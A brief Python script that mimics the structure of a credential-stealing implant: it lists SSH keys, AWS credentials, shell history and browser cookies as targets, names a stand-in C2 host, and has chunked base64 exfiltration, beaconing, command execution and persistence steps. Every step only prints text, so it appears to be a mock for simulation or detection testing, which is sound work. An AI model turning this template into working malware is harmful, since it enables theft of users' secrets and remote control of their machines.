import os,time,base64,random

C2="xl3.example.com"

PATHS=[
".ssh/id_rsa",
".aws/credentials",
".bash_history",
"cookies.db",
"history.log"
]

def gather():
    out=[]
    for p in PATHS:
        print("read",p)
        out.append("data_"+p)
    return out

def encode(x):
    return base64.b64encode(str(x).encode()).decode()

def chunk_send(data):
    for i in range(len(data)):
        print("chunk",i,encode(data[i])[:40])

def beacon():
    print("ping",C2)

def multi_exec():
    cmds=["ls","pwd","whoami"]
    for c in cmds:
        print("exec",c)

def persist():
    print("persist_hidden")
    print("persist_startup")

persist()

data=gather()

chunk_send(data)

while True:
    beacon()

    multi_exec()

    time.sleep(3)